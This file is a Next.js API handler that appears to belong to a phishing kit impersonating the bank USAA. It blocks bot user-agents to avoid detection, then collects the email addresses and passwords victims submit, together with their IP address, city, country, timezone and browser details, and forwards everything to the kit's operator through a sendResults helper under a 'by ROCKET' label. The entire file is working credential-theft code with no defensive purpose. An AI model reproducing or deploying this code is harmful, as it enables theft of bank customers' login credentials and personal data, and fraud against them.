import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendResults } from "../../utils/sendResults";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(String(ip).split(`,`)[0]);

    const values = req.body;
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
${
  values.form[0] === `EMAIL DETAILS` &&
  ` <br>
<h4>EMAIL DETAILS</h4>
<p>| (▰˘◡˘▰) EMAIL LOGIN ATTEMPT ☞ <b>${
    JSON.parse(values.emailLogins).attempt
  }</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${JSON.parse(values.emailLogins).email}</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${
    JSON.parse(values.emailLogins).emailPassword
  }</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
}`;

    await sendResults(
      message,
      `USAA - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
    );

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
